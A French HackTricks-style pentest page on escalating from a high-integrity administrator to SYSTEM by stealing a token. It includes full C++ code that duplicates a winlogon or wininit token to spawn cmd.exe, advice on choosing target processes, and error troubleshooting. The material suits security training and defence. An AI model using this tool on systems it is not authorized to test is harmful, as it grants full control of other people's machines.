# SeImpersonate de High à System

{{#include ../../banners/hacktricks-training.md}}

Cette page traite de la version **manuelle** du passage d’un processus administrateur à **intégrité élevée** à **`NT AUTHORITY\SYSTEM`**, en **ouvrant un processus SYSTEM non protégé, en dupliquant son token et en lançant un processus enfant avec ce token**.

Si vous disposez uniquement de **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, mais que vous **ne pouvez pas ouvrir un processus SYSTEM approprié**, la méthode **Potato / named-pipe** est généralement plus fiable :

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Si votre objectif n’est pas seulement d’obtenir `SYSTEM`, mais un **token SYSTEM avec autant de privilèges que possible**, consultez également :

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Avant d’essayer de voler un token, validez rapidement le contexte :
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Notes pratiques :

- Un jeton d’administrateur **High Integrity** suffit généralement pour **activer `SeDebugPrivilege`** et ouvrir de nombreux processus SYSTEM non protégés.
- **`CreateProcessWithTokenW` nécessite `SeImpersonatePrivilege`** sur le caller. Si cette API échoue avec `1314`, utilisez `CreateProcessAsUserW` après avoir déjà dupliqué un jeton primaire SYSTEM.
- Sur les versions modernes de Windows, **`lsass.exe` est souvent une mauvaise cible**, car **LSA protection / PPL** bloque l’accès, même pour les administrateurs disposant de `SeDebugPrivilege`. Préférez **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ou un **`svchost.exe`** précoce exécuté en tant que SYSTEM.
- Tous les processus SYSTEM ne disposent pas d’un jeton aussi utile. Si vous obtenez SYSTEM mais constatez l’absence de certains privilèges, essayez un autre processus SYSTEM au lieu de supposer que la technique est défectueuse.

## Choisissez soigneusement le PID

La manière la plus simple de rendre cette technique fiable consiste à **choisir un processus SYSTEM dont la DACL autorise effectivement les Administrators à interroger le processus et à dupliquer son jeton**.

Bons candidats à tester en premier :

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- certaines instances précoces de `svchost.exe` exécutées en tant que SYSTEM

À éviter par défaut :

- `lsass.exe` sur les hôtes où **RunAsPPL / LSA protection** est activé
- les processus protégés ou sensibles à la sécurité qui renvoient `Access denied`, même après l’activation de `SeDebugPrivilege`

Vous pouvez inspecter les processus candidats ainsi que leurs jetons/ACL avec **Process Explorer** ou **Process Hacker** exécuté avec des privilèges élevés.

### Code

Le code suivant provient de [cet article sur les access tokens](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Il accepte un **identifiant de processus en argument** et démarre un shell de commandes **en tant que l’utilisateur** de ce processus.<sup>[[3]](#references)</sup>\
Depuis un processus **High Integrity**, vous pouvez **indiquer le PID d’un processus exécuté en tant que System** (comme `winlogon` ou `wininit`) et exécuter un `cmd.exe` en tant que SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Notes utiles sur les API / droits d’accès

L’exemple utilise `MAXIMUM_ALLOWED`, mais pour les opérations réelles, il est utile de garder à l’esprit les éléments minimaux impliqués :

- `OpenProcessToken()` nécessite uniquement que le **handle du processus** ait été ouvert avec **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Pour utiliser `CreateProcessWithTokenW()`, le **handle du token primaire** doit disposer de **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` doit créer un **token primaire** (`TokenPrimary`), et pas seulement un token d’impersonation.
- Si vous avez déjà effectué une impersonation de SYSTEM et que `CreateProcessWithTokenW()` échoue toujours avec `1314`, essayez plutôt `CreateProcessAsUserW()`.

Cela signifie qu’ouvrir le processus cible avec `PROCESS_ALL_ACCESS` est généralement inutile et plus bruyant que de demander uniquement les droits nécessaires pour interroger le token.

## Erreur

Dans certains cas, vous pouvez essayer d’effectuer une impersonation de SYSTEM, sans succès, avec une sortie semblable à la suivante :
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Cela signifie que même si vous utilisez un niveau d’intégrité **High Integrity**, vous ne disposez pas de **suffisamment de permissions** sur ce processus/token cible.\
Vérifions les permissions actuelles de l’utilisateur Administrator sur les processus `svchost.exe` avec **Process Explorer** (vous pouvez également utiliser **Process Hacker**) :

1. Sélectionnez un processus `svchost.exe`
2. Faites un clic droit --> Propriétés
3. Dans l’onglet « Sécurité », cliquez sur le bouton « Permissions » en bas à droite
4. Cliquez sur « Avancé »
5. Sélectionnez « Administrators » et cliquez sur « Modifier »
6. Cliquez sur « Afficher les permissions avancées »

![Code - Erreur : 6. Cliquez sur « Afficher les permissions avancées »](<../../images/image (437).png>)

L’image précédente contient tous les privilèges que « Administrators » possèdent sur le processus sélectionné (comme vous pouvez le voir dans le cas de `svchost.exe`, ils disposent uniquement des privilèges « Query »).

Voici les privilèges dont disposent « Administrators » sur `winlogon.exe` :

![Code - Erreur : Consultez les privilèges dont disposent « Administrators » sur winlogon.exe](<../../images/image (1102).png>)

Dans ce processus, « Administrators » peuvent « Read Memory » et « Read Permissions », ce qui permet probablement aux Administrators d’usurper le token utilisé par ce processus.

### Causes courantes d’échec

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`** : la DACL du processus vous bloque, ou la cible est **protected/PPL**. Choisissez un autre processus SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`** : votre handle de token a été ouvert sans suffisamment de droits, ou la DACL du token cible empêche sa duplication.
- **`CreateProcessWithTokenW()` -> `1314`** : le processus appelant n’a pas actuellement activé **`SeImpersonatePrivilege`**. Essayez d’abord de l’activer, ou utilisez `CreateProcessAsUserW()` avec le primary token dupliqué.
- **`CreateProcessWithTokenW()` -> `1326`** après des échecs précédents : cela signifie souvent que l’étape précédente de duplication/impersonation du token a échoué ; il n’existe donc aucun primary token utilisable pour lancer le processus enfant.

## Notes de l’opérateur

- Cette technique est idéale lorsque vous êtes déjà **local admin + high integrity** et que vous souhaitez simplement disposer d’une méthode manuelle et rapide pour obtenir SYSTEM, sans démarrer de service ni mettre en place une chaîne de coercition via named pipe.
- Dans les environnements Windows 11 / Server renforcés, la **LSA protection** est de plus en plus courante ; un workflow supposant que `lsass.exe` est toujours lisible est donc fragile. **`winlogon.exe` / `wininit.exe` / `services.exe` sont généralement de meilleurs premiers choix**.<sup>[[2]](#references)</sup>
- Si vous obtenez un contexte de **service account** plutôt que celui d’un bureau admin élevé, la **Potato family** est généralement mieux adaptée que cette page.



## References

- [1] [Microsoft : CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost : Abuser des tokens Windows pour compromettre Active Directory sans toucher à LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Comprendre et exploiter les tokens de processus — Partie II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
